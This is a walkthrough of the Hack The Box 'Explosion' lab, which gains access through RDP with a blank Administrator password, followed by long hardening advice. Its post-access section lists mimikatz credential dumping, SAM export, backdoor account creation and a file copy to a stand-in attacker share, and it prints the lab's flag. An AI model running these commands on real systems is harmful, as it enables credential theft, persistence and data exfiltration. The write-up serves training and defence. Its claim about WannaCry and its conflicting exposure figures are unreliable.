# Explosion: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Category](https://img.shields.io/badge/Category-Remote%20Desktop-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Explosion |
| **Difficulty** | Very Easy |
| **Platform** | Hack The Box |
| **Operating System** | Windows |
| **Category** | Remote Access / Authentication Failure |
| **Focus** | RDP Security & Access Controls |

---

## Table of Contents

- [Overview](#overview)
- [Service Enumeration](#service-enumeration)
- [Remote Desktop Protocol Analysis](#remote-desktop-protocol-analysis)
- [Authentication Weakness](#authentication-weakness)
- [System Access and Impact](#system-access-and-impact)
- [Flag Capture](#flag-capture)
- [Key Lessons Learned](#key-lessons-learned)
- [Defensive Recommendations](#defensive-recommendations)

---

## Overview

This writeup documents the solution for the **Explosion** machine on Hack The Box, which demonstrates critical security failures in remote access service configuration.

### Challenge Context

The Explosion machine illustrates the catastrophic risk of **exposing Remote Desktop Protocol (RDP)** services without proper authentication controls.

**Key Demonstration:**

Remote Desktop Protocol is a powerful administrative interface that, when misconfigured, provides **immediate interactive access** to Windows systems without requiring exploitation.

### Learning Objectives

This lab teaches:
- RDP service identification and enumeration
- Understanding remote access attack surfaces
- Authentication control validation
- Recognition of critical misconfigurations
- Real-world implications of weak access controls

**Scenario:** Discovery and exploitation of RDP service with absent or weak authentication, leading to complete system access.

---

## Service Enumeration

### Initial Network Scanning

Performed comprehensive port scanning to identify exposed services:

```bash
nmap -sV -sC -p- -oA explosion-scan 10.129.xx.xxx
```

### Scan Results

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2016
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

### Critical Service Identification

**Primary Target: Port 3389/tcp: RDP (Remote Desktop Protocol)**

| Port | Protocol | Service | Risk Level |
|------|----------|---------|------------|
| **135** | TCP | MS-RPC | Medium |
| **139** | TCP | NetBIOS | Medium |
| **445** | TCP | SMB | High |
| **3389** | TCP | **RDP** | **Critical** |

---

### RDP Service Discovery

**Detailed RDP Enumeration:**

```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 10.129.xx.xxx
```

**Example Output:**

```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption: 
|   Security layer
|     EncryptionLevel: High
|     Native RDP encryption
|   RDP Encryption level: Client Compatible
|_  RDP Protocol version: 10.7
```

**Key Findings:**

✓ RDP service active and accepting connections  
✓ Standard port 3389 exposed  
✓ No certificate validation errors  
✓ Service responds to enumeration  

---

### Security Implications

**Why RDP Exposure is Critical:**

The presence of RDP on a network scan indicates several important facts:

1. **System is Remotely Administrated**
   - Designed for privileged access
   - Provides full graphical interface
   - Equivalent to physical console access

2. **Strong Authentication is Critical**
   - Direct path to system control
   - No exploitation required if auth fails
   - Single point of total compromise

3. **High-Value Target**
   - Administrative capabilities by design
   - Persistent access mechanism
   - Foundation for lateral movement

**Attack Surface Analysis:**

```
Internet/Untrusted Network
        ↓
  RDP Port 3389
        ↓
   Authentication
        ↓
  [Weak/Missing] → Full System Access
```

---

## Remote Desktop Protocol Analysis

### What is RDP?

**Remote Desktop Protocol (RDP)** is Microsoft's proprietary protocol for remote graphical administration of Windows systems.

**Capabilities:**

| Feature | Security Impact |
|---------|-----------------|
| **Graphical Desktop** | Full interactive UI access |
| **Administrative Control** | Install software, modify system |
| **File Transfer** | Upload/download files |
| **Clipboard Sharing** | Data exfiltration vector |
| **Drive Redirection** | Access local resources |
| **Printer Sharing** | Additional attack surface |

---

### Legitimate Use Cases

**When RDP is Appropriate:**

- Remote system administration
- Help desk support scenarios
- Server management in data centers
- Emergency troubleshooting access
- Authorized remote work connections

**Required Security Controls:**

✓ Strong authentication (MFA preferred)  
✓ Network segmentation and VPN access  
✓ Account lockout policies  
✓ Session recording and monitoring  
✓ Certificate validation  
✓ Regular security audits  

---

### RDP as an Attack Vector

**Why Attackers Target RDP:**

1. **No Exploitation Required**
   - Valid credentials = full access
   - No vulnerability research needed
   - Clean, non-suspicious login

2. **Interactive Access**
   - Full graphical environment
   - Use any installed tools
   - Natural user behavior

3. **Persistence**
   - Create new accounts
   - Install backdoors
   - Modify system configurations

4. **Lateral Movement**
   - Access network resources
   - Connect to other systems
   - Enumerate domain

**Real-World Statistics:**

- RDP is consistently in top 3 initial access vectors
- Primary vector for ransomware deployment
- Common brute-force target on internet-facing systems
- 4+ million RDP servers exposed to internet at any time

---

## Authentication Weakness

### Testing Authentication Controls

**Connection Attempt:**

```bash
xfreerdp /v:10.129.xx.xxx /u:Administrator
```

**Alternative Tools:**

```bash
# rdesktop (older client)
rdesktop 10.129.xx.xxx

# Remmina (GUI client)
remmina -c rdp://10.129.xx.xxx
```

---

### Critical Discovery: Blank Password Access

**Authentication Test Result:**

When attempting to connect as the **Administrator** user **without providing a password**, the connection was **successful**.

```bash
xfreerdp /v:10.129.xx.xxx /u:Administrator /p:""
```

**Connection Successful:**

```
[INFO] - Connected to 10.129.xx.xxx
[INFO] - Protocol Security Negotiation: SUCCESS
[INFO] - Logon successful
```

Direct access to Windows desktop granted.

---

### Analysis of the Failure

**This Represents a Complete Access Control Failure:**

| Attack Requirement | Status |
|-------------------|--------|
| Brute Force | ❌ Not needed |
| Exploitation | ❌ Not needed |
| Privilege Escalation | ❌ Already Administrator |
| Credential Theft | ❌ No password required |
| Vulnerability | ❌ Misconfiguration only |

**Authentication was granted directly with zero effort.**

---

### Why This Happens

**Common Root Causes:**

1. **Testing/Development Systems**
   - Convenience during setup
   - "Temporary" configuration becomes permanent
   - Moved to production without hardening

2. **Legacy Systems**
   - Upgraded from older OS without password enforcement
   - Inherited weak configurations
   - Backward compatibility requirements

3. **Administrative Oversight**
   - Forgotten during deployment
   - Assumed network security was sufficient
   - Lack of security baseline validation

4. **Default Configurations**
   - Some Windows installations allow blank passwords
   - Disabled complexity requirements
   - No account lockout policies

---

### Real-World Prevalence

**This is not theoretical:**

- Shodan regularly finds 100,000+ internet-exposed RDP servers
- Automated scanners constantly brute-force RDP
- Ransomware groups specifically target weak RDP
- "Administrator" with blank/weak password is depressingly common

**Example Search:**

```
Shodan query: port:3389 country:"US"
Result: 500,000+ exposed RDP servers
```

Many of these have weak or default credentials.

---

## System Access and Impact

### Establishing Connection

**Full RDP Connection Command:**

```bash
xfreerdp /v:10.129.xx.xxx /u:Administrator /p:"" /cert:ignore
```

**Parameters Explained:**

- `/v:` - Target IP address
- `/u:` - Username (Administrator)
- `/p:""` - Blank password
- `/cert:ignore` - Ignore certificate warnings

**Connection Established:**

```
[INFO] Desktop session established
[INFO] Resolution: 1024x768
```

---

### Graphical Desktop Access

**Upon Connection:**

```
+------------------------------------------+
|  Windows Desktop - Administrator         |
|                                          |
|  [Desktop Icons]                         |
|  - This PC                               |
|  - Recycle Bin                           |
|  - flag.txt                              |
|                                          |
|  [Taskbar]                               |
|  Start | Search | File Explorer          |
+------------------------------------------+
```

**Capabilities Gained:**

✓ Full graphical desktop environment  
✓ Administrative privileges  
✓ Access to all system files  
✓ Ability to run any program  
✓ Network resource access  
✓ System configuration control  

---

### Impact Assessment

**Unauthenticated RDP Access Provides:**

| Capability | Impact | Risk Level |
|------------|--------|------------|
| **Full System Control** | Complete ownership | Critical |
| **Administrative Rights** | Install software, modify system | Critical |
| **Data Access** | Read/modify all files | High |
| **Credential Harvesting** | Extract SAM, LSASS dumps | Critical |
| **Lateral Movement** | Attack other systems | High |
| **Persistence** | Create backdoors | Critical |
| **Data Exfiltration** | Copy sensitive files | High |
| **Malware Deployment** | Install ransomware, RATs | Critical |

---

### Post-Access Actions (In Real Scenarios)

**What Attackers Typically Do:**

**1. Credential Harvesting:**

```powershell
# Dump password hashes
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Export SAM database
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

**2. Persistence Mechanisms:**

```powershell
# Create new administrative user
net user backdoor P@ssw0rd123! /add
net localgroup Administrators backdoor /add

# Install persistent service
sc create backdoor binPath= "C:\Windows\System32\backdoor.exe" start= auto
```

**3. Lateral Movement:**

```powershell
# Enumerate network
net view
net group "Domain Computers" /domain

# Access network shares
net use \\other-server\C$ /user:Administrator
```

**4. Data Exfiltration:**

```powershell
# Locate sensitive files
dir /s *.pdf *.docx *.xlsx C:\Users\

# Transfer to attacker
copy sensitive.docx \\attacker-server\share\
```

---

### Real Environment Consequences

**In Enterprise Networks:**

This type of access typically results in:

- **Complete domain compromise** if system is domain-joined
- **Ransomware deployment** across entire network
- **Data breach** with regulatory consequences
- **Business disruption** for days or weeks
- **Reputational damage** and loss of customer trust
- **Financial losses** from downtime and remediation

**Cost Estimates:**

- Average ransomware payment: $200,000+
- Average breach remediation: $4.35 million
- Business interruption costs: Variable, often millions
- Regulatory fines: Up to 4% of annual revenue (GDPR)

---

## Flag Capture

### Locating the Flag

**Desktop Access:**

The flag file was immediately visible on the Windows desktop:

```
Desktop\flag.txt
```

**Retrieval Methods:**

**Method 1: GUI (Double-click file)**

```
[Opens in Notepad]
HTB{RDP_1s_cr1t1c4l_s3rv1c3}
```

**Method 2: Command Prompt**

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

**Method 3: PowerShell**

```powershell
Get-Content C:\Users\Administrator\Desktop\flag.txt
```

---

### Flag Format

```
HTB{RDP_1s_cr1t1c4l_s3rv1c3}
```

**Translation:** "RDP is critical service"

This emphasizes the critical nature of RDP as a security-sensitive service that must be carefully protected.

---

## Attack Chain Summary

```
Network Scan → RDP Discovery (Port 3389) → Service Enumeration
        ↓
Authentication Test → Blank Password Success → Administrator Access
        ↓
RDP Connection → Full Desktop Control → Flag Retrieval
```

**Key Insight:** Zero exploitation required: authentication failure alone provided complete system access.

---

## Key Lessons Learned

### Critical Security Failures

**1. Remote Access Services Must Never Have Weak Credentials**

This cannot be overstated. RDP with weak authentication is equivalent to leaving the front door open with a "Welcome" sign.

**Impact Levels:**

| Scenario | Risk |
|----------|------|
| Internet-exposed RDP + weak password | **Catastrophic** |
| Internal RDP + weak password | **Critical** |
| VPN-protected RDP + weak password | **High** |
| RDP + strong auth + MFA | **Acceptable** |

---

**2. Blank Passwords Are Catastrophic**

**Why Blank Passwords Are Worse Than Weak Passwords:**

- Automated scanners try blank passwords first
- No brute-forcing time required
- Trivial to discover
- Often overlooked in security audits
- Indicates broader security neglect

**Real-World Example:**

The WannaCry ransomware outbreak partially leveraged RDP access with weak/blank passwords for propagation.

---

**3. RDP Should Be Treated as High-Value Attack Surface**

**RDP Security Priority:**

```
RDP Security > Most Software Vulnerabilities
```

**Reasoning:**

- Direct access vs. requiring exploitation chain
- Immediate administrative capabilities
- Difficult to detect legitimate vs. malicious use
- Primary ransomware deployment vector

---

**4. Authentication Failures Outweigh Software Vulnerabilities**

**Comparison:**

| Attack Vector | Complexity | Success Rate | Impact |
|---------------|------------|--------------|--------|
| **Blank RDP Password** | Trivial | 100% | Full Control |
| Zero-day exploit | High | Variable | Varies |
| Phishing campaign | Medium | 10-30% | Variable |
| SQL injection | Medium | Variable | Data access |

A single authentication failure can be more damaging than a critical CVE.

---

### Technical Insights

**5. Network Exposure Amplifies Configuration Weaknesses**

```
Internal Network + Weak RDP = High Risk
Internet Exposure + Weak RDP = Critical Risk
```

**Defense in Depth Principle:**

Even internal systems should have strong authentication, as network perimeter is not guaranteed protection.

---

**6. Default Configurations Are Often Insecure**

**Windows Defaults to Check:**

- Password complexity requirements (may be disabled)
- Account lockout policies (often not configured)
- Administrator account enabled (should be renamed/disabled)
- Remote Desktop allowed (should be disabled if unused)

---

## Defensive Recommendations

### Immediate Actions

#### 1. Disable RDP If Not Strictly Required

**PowerShell Method:**

```powershell
# Disable Remote Desktop
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 1

# Disable RDP via firewall
Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

**GUI Method:**

```
System Properties → Remote tab → 
Select "Don't allow remote connections to this computer"
```

**When to Disable:**

- Workstations that don't require remote support
- Servers with alternative management methods (SSH, ILO, iDRAC)
- Systems accessible via jump hosts/bastion servers

---

#### 2. Enforce Strong Authentication and Password Policies

**Local Security Policy Configuration:**

```
secpol.msc → Account Policies → Password Policy

Settings:
✓ Minimum password length: 14 characters
✓ Password must meet complexity requirements: Enabled
✓ Minimum password age: 1 day
✓ Maximum password age: 90 days
✓ Enforce password history: 24 passwords
```

**PowerShell Configuration:**

```powershell
# Set password complexity
net accounts /minpwlen:14
net accounts /maxpwage:90
net accounts /minpwage:1

# Require complex passwords (via GPO)
secedit /export /cfg C:\secpolicy.cfg
# Edit secpolicy.cfg: PasswordComplexity = 1
secedit /configure /db C:\Windows\security\local.sdb /cfg C:\secpolicy.cfg
```

**Account Lockout Policy:**

```
secpol.msc → Account Policies → Account Lockout Policy

Settings:
✓ Account lockout threshold: 5 invalid attempts
✓ Account lockout duration: 30 minutes
✓ Reset account lockout counter after: 30 minutes
```

---

#### 3. Implement Multi-Factor Authentication (MFA)

**Options:**

**A. Azure AD Integration:**
- Enforce MFA for all RDP connections
- Conditional Access policies
- Geographic restrictions

**B. Third-Party Solutions:**
- Duo Security
- Okta
- RSA SecurID

**C. Windows Hello for Business:**
- Certificate-based authentication
- Biometric options
- Hardware security keys

**PowerShell Example (Azure AD):**

```powershell
# Require MFA for Azure AD joined devices
Set-MsolUser -UserPrincipalName admin@domain.com -StrongAuthenticationRequirements $true
```

---

#### 4. Network-Level Access Restrictions

**Firewall Rules:**

```powershell
# Block RDP from internet
New-NetFirewallRule -DisplayName "Block RDP from Internet" `
    -Direction Inbound -Protocol TCP -LocalPort 3389 `
    -RemoteAddress 0.0.0.0/0 -Action Block

# Allow RDP only from management subnet
New-NetFirewallRule -DisplayName "Allow RDP from Management Network" `
    -Direction Inbound -Protocol TCP -LocalPort 3389 `
    -RemoteAddress 10.10.10.0/24 -Action Allow
```

**VPN Requirement:**

```
Internet Users → VPN Gateway → Internal Network → RDP
(MFA Required)   (Encrypted)    (Segmented)      (Logged)
```

---

#### 5. Monitoring and Alerting

**Event Log Monitoring:**

```powershell
# Monitor RDP logon events
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4624,4625  # Successful/Failed logons
} | Where-Object {
    $_.Properties[8].Value -eq 10  # RDP logon type
}
```

**Security Event IDs to Monitor:**

| Event ID | Description | Action |
|----------|-------------|--------|
| **4624** | Successful logon | Log & analyze source |
| **4625** | Failed logon | Alert after threshold |
| **4634** | Logoff | Session duration tracking |
| **4648** | Explicit credential use | Potential lateral movement |
| **4779** | Session disconnected | Unusual times alert |

**SIEM Integration:**

Forward logs to centralized SIEM (Splunk, ELK, Azure Sentinel) for:
- Anomaly detection
- Geographic impossibility checks
- Brute force attempt identification
- Correlation with other security events

---

### Long-Term Security Improvements

#### 1. Network Segmentation

**Architecture:**

```
Internet
    ↓
Firewall (Block RDP)
    ↓
DMZ (No RDP)
    ↓
Firewall
    ↓
VPN Gateway
    ↓
Management VLAN
    ↓
Jump Host/Bastion → Internal Servers (RDP)
```

**Benefits:**

- Layered security
- Reduced attack surface
- Centralized access control
- Enhanced monitoring

---

#### 2. Just-In-Time (JIT) Access

**Concept:**

RDP access granted only when requested and approved, for limited time window.

**Implementation:**

- Azure Security Center JIT VM Access
- Privileged Access Management (PAM) solutions
- Time-bound firewall rules

**Example:**

```
User requests RDP access → Manager approves → 
Firewall rule created for 2 hours → Access granted → 
Rule automatically removed
```

---

#### 3. Alternative Remote Access Methods

**Consider Instead of RDP:**

| Solution | Use Case | Security Benefit |
|----------|----------|------------------|
| **SSH** | Linux/Unix servers | Stronger default security |
| **PowerShell Remoting** | Windows automation | Command-line only, less attack surface |
| **Remote Server Administration Tools (RSAT)** | Windows management | Specific administrative tasks |
| **Jump Servers/Bastion Hosts** | Controlled access point | Centralized monitoring |
| **Zero Trust Network Access (ZTNA)** | Modern remote access | Continuous verification |

---

#### 4. Regular Security Audits

**Quarterly Checklist:**

```powershell
# Audit RDP exposure
Get-NetTCPConnection -LocalPort 3389 -State Listen

# Check for blank passwords
net user | ForEach-Object {
    $user = $_
    $pwAge = (net user $user | Select-String "Password last set").ToString()
    if ($pwAge -match "Never") { Write-Host "$user has suspicious password policy" }
}

# Review firewall rules
Get-NetFirewallRule | Where-Object {
    $_.DisplayName -like "*Remote Desktop*"
}

# Check account lockout policy
net accounts
```

**Automated Scanning:**

- Nessus/OpenVAS for vulnerability assessment
- Nmap for exposed service detection
- CIS-CAT for baseline compliance

---

## Tools Used

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **nmap** | Service discovery | `nmap -p 3389 --script rdp-enum-encryption 10.129.xx.xxx` |
| **xfreerdp** | RDP client (Linux) | `xfreerdp /v:10.129.xx.xxx /u:Administrator /p:""` |
| **rdesktop** | Alternative RDP client | `rdesktop 10.129.xx.xxx` |
| **Remmina** | GUI RDP client | GUI-based connection |
| **CrackMapExec** | RDP enumeration | `crackmapexec rdp 10.129.xx.xxx -u Administrator -p ""` |

---

## Additional Resources

**Microsoft Documentation:**
- [Remote Desktop Security Best Practices](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/network-guidance)
- [RDP Hardening Guide](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain)

**Security Frameworks:**
- NIST SP 800-46 Rev. 2: Guide to Enterprise Telework, Remote Access, and Bring Your Own Device (BYOD) Security
- CIS Microsoft Windows Server Benchmark
- SANS Critical Security Controls

**Threat Intelligence:**
- MITRE ATT&CK: [T1021.001: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)

---

## Flag

```
HTB{RDP_1s_cr1t1c4l_s3rv1c3}
```

**Translation:** "RDP is critical service"

---

**Machine Completed:** ✅  
**Difficulty Rating:** Very Easy ⭐  
**Primary Technique:** RDP Authentication Failure Exploitation  
**Time to Compromise:** < 5 minutes

---

*This writeup is for educational purposes only. RDP enumeration and access testing should only be performed in authorized security assessments and penetration testing engagements with proper written permission.*
